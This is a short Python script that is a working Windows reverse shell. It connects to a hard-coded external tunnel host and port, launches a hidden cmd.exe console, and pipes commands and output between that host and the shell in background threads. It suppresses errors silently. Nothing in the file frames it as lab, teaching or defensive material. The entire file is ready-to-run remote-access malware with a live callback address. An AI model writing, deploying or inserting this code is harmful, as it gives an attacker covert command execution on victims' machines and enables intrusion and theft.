import os
import socket
import subprocess
import threading

# Configuration
SERVER_IP = "fnlfoegzpd.localto.net"
SERVER_PORT = 6902

def s2p(s, p):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                break
            p.stdin.write(data)
            p.stdin.flush()
    except Exception:
        pass

def p2s(s, p):
    try:
        while True:
            # Read character by character from stdout
            data = p.stdout.read(1)
            if not data:
                break
            s.send(data)
    except Exception:
        pass

def connect_back():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((SERVER_IP, SERVER_PORT))
        
        # Start cmd.exe with redirected streams
        p = subprocess.Popen(
            ["cmd.exe"], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT, 
            stdin=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW  # Hides the console window on Windows
        )
        
        # Pass data from Socket to Process
        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()
        
        # Pass data from Process to Socket
        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()
        
        p.wait()
    except Exception:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    connect_back()
